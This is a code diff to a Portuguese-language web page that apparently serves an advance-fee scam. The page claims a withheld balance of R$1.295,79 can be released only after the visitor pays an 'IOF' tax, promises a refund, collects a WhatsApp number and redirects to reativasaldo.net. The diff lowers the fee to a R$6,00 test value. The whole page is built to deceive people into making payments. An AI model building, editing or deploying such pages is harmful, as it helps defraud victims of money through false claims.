@@ -141,7 +141,7 @@
     <!-- Title and Description -->
     <div class="max-w-md mx-auto">
       <h1 class="title font-bold text-gray-900 mb-6 leading-tight">Pagamento do IOF Obrigatório para Liberação da Cota</h1>
-      <p class="description text-gray-600 mb-6 leading-6">Para liberar o valor da cota de R$1.295,79, é necessário o pagamento do (IOF) no valor de R$28,80.</p>
+      <p class="description text-gray-600 mb-6 leading-6">Para liberar o valor da cota de R$1.295,79, é necessário o pagamento do (IOF) no valor de R$6,00 (valor de teste).</p>
 
       <!-- Warning -->
       <div class="custom-warning p-2 mb-6 max-w-md mx-auto">
@@ -158,7 +158,7 @@
           </div>
           <div class="flex justify-between">
             <span class="text-gray-600 text-sm font-medium">Valor a ser pago (IOF)</span>
-            <span class="font-semibold text-red-600 text-sm">- R$28,80</span>
+            <span class="font-semibold text-red-600 text-sm">- R$6,00</span>
           </div>
           <p class="text-xs text-gray-500">*(Reembolsado após Aprovação da Conta e Liberação do Saque)</p>
           <hr class="my-1 border-t border-black">
@@ -219,7 +219,7 @@
       <div class="mb-6 max-w-md mx-auto">
         <h2 class="text-base font-semibold mb-2">Dúvidas Frequentes</h2>
         <div class="space-y-2">
-          <p class="text-sm font-medium border-b border-gray-200 pb-1">Por que o IOF de R$28,80 não é descontado do saldo acumulado de R$1295,79?</p>
+          <p class="text-sm font-medium border-b border-gray-200 pb-1">Por que o IOF de R$6,00 não é descontado do saldo acumulado de R$1295,79?</p>
           <p class="text-sm font-medium border-b border-gray-200 pb-1">Como realizar o pagamento do (IOF)?</p>
           <p class="text-sm font-medium border-b border-gray-200 pb-1"><strong>NÃO</strong> consigo clicar no botão de "Pagar Imposto"</p>
         </div>
@@ -307,7 +307,7 @@
       const paymentStatus = document.getElementById('paymentStatus');
       const paymentStatusGenerated = document.getElementById('paymentStatusGenerated');
 
-      const valorIOFcentavos = 600; // Corrigido para R$ 28,80 (2880 centavos)
+      const valorIOFcentavos = 600; // Ajustado para R$ 6,00 (600 centavos) para testes
       const redirectUrl = 'https://reativasaldo.net/pagamentoiof2';
 
       function validateWhatsAppInput() {
@@ -396,7 +396,7 @@
           items: [
             {
               unitPrice: valorIOFcentavos,
-              title: "Taxa de IOF - Reativa Saldo",
+              title: "Taxa de IOF - Reativa Saldo (Teste)",
               quantity: 1,
               tangible: false
             }
